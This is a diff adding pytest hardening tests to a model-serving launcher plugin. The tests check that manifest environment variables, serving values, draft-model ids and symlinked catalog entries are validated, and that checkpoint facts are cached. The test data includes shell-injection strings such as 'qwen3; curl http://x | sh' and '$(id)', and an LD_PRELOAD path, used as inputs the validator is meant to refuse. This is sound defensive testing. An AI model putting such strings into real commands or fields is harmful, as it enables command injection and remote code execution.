@@ -399,3 +399,96 @@ def test_plugin_is_bound_to_an_alpha_feature_flag():
     assert plugin_feature_flag("lil") == lil.FEATURE_FLAG
     flag = get_feature(lil.FEATURE_FLAG)
     assert flag is not None and flag.default is False and flag.channel_defaults.get("alpha") is True
+
+
+# --- review hardening ----------------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "env,match",
+    [
+        ({"PYTHONPATH": "/cache/huggingface/hub/models--x/snapshots/y"}, "managed by the launcher"),
+        ({"LD_PRELOAD": "/tmp/x.so"}, "managed by the launcher"),
+        ({"NCCL_SOCKET_IFNAME": "eth9"}, "managed by the launcher"),
+        ({"NCCL_ANYTHING": "1"}, "managed by the launcher"),
+        ({"HF_HUB_OFFLINE": "0"}, "managed by the launcher"),
+        ({"bad-name": "1"}, "invalid variable name"),
+        ({"OK_NAME": 32}, "must be strings"),
+        ({"OK_NAME": "a\nb"}, "single line"),
+    ],
+)
+def test_manifest_environment_is_held_to_lil_rules(tmp_path, env, match):
+    entry = load_entry(_manifest(tmp_path, "Env", environment=env))
+    with pytest.raises(LilManifestError, match=match):
+        translate(entry, CheckpointFacts(), strict=False)
+
+
+def test_manifest_override_environment_is_checked_too(tmp_path):
+    entry = load_entry(_manifest(tmp_path, "Env", overrides=[{"when": {"tp": 1}, "environment": {"LD_LIBRARY_PATH": "/x"}}]))
+    with pytest.raises(LilManifestError, match="managed by the launcher"):
+        translate(entry, CheckpointFacts(), strict=False)
+
+
+@pytest.mark.parametrize("value", ["qwen3; curl http://x | sh", "$(id)", "a b", "`id`", "x&&y"])
+def test_plain_values_that_are_shell_syntax_are_refused(tmp_path, value):
+    """Plain strings reach the bash serve command unquoted."""
+    entry = load_entry(_manifest(tmp_path, "Shell", serving={"served_model_name": "m", "reasoning_parser": value}))
+    with pytest.raises(LilManifestError, match="not a plain value"):
+        translate(entry, CheckpointFacts(), strict=False)
+
+
+def test_dflash_model_must_be_a_repo_id(tmp_path):
+    entry = load_entry(_manifest(tmp_path, "Draft", speculators={"default": "dflash", "dflash": {"tokens": 3, "model": "../../x"}}))
+    with pytest.raises(LilManifestError, match="Hugging Face model id"):
+        translate(entry, CheckpointFacts(), strict=False)
+
+
+def test_catalog_entries_symlinked_outside_are_ignored(tmp_path):
+    outside = _manifest(tmp_path / "elsewhere", "Real")
+    catalog = tmp_path / "catalog"
+    catalog.mkdir()
+    (catalog / "Linked").symlink_to(outside.parent)
+    _manifest(catalog, "Inside")
+    assert [p.parent.name for p in lil.iter_manifests(catalog)] == ["Inside"]
+
+
+def test_facts_are_recorded_once_known_so_identity_is_stable(monkeypatch):
+    """TP is identity: a later load (stop/logs) must see the launch's facts even with the Hub gone."""
+    import sparkrun.models.vram as vram
+
+    monkeypatch.setattr(vram, "fetch_model_config", lambda *a, **k: {"num_attention_heads": 32})
+    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: 123)
+    first = lil.gather_facts("org/m", "a" * 40, offline=False)
+
+    def _gone(*_a, **_k):
+        raise AssertionError("the recorded facts must answer")
+
+    monkeypatch.setattr(vram, "fetch_model_config", _gone)
+    monkeypatch.setattr(vram, "fetch_safetensors_size", _gone)
+    assert lil.gather_facts("org/m", "a" * 40, offline=True) == first == CheckpointFacts({"num_attention_heads": 32}, 123)
+
+
+def test_incomplete_facts_are_not_recorded(monkeypatch):
+    import sparkrun.models.vram as vram
+
+    monkeypatch.setattr(vram, "fetch_model_config", lambda *a, **k: {"num_attention_heads": 32})
+    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: None)
+    lil.gather_facts("org/partial", None, offline=False)
+    monkeypatch.setattr(vram, "fetch_safetensors_size", lambda *a, **k: 7)
+    assert lil.gather_facts("org/partial", None, offline=False).weight_bytes == 7
+
+
+def test_local_snapshot_is_sized_by_shard_files_and_only_when_complete(tmp_path, monkeypatch):
+    snapshot = tmp_path / "snap"
+    snapshot.mkdir()
+    (snapshot / "config.json").write_text("{}")
+    (snapshot / "model.safetensors.index.json").write_text(
+        json.dumps({"metadata": {"total_size": 1}, "weight_map": {"a": "s1.safetensors", "b": "s2.safetensors"}})
+    )
+    (snapshot / "s1.safetensors").write_bytes(b"x" * 10)
+    import sparkrun.models.vram as vram
+
+    monkeypatch.setattr(vram, "cached_hub_file", lambda *a, **k: str(snapshot / "config.json"))
+    assert lil._local_weight_bytes("org/m", None, None) is None  # s2 missing: a partial download
+    (snapshot / "s2.safetensors").write_bytes(b"x" * 5)
+    assert lil._local_weight_bytes("org/m", None, None) == 15  # file sizes, not the index's total_size
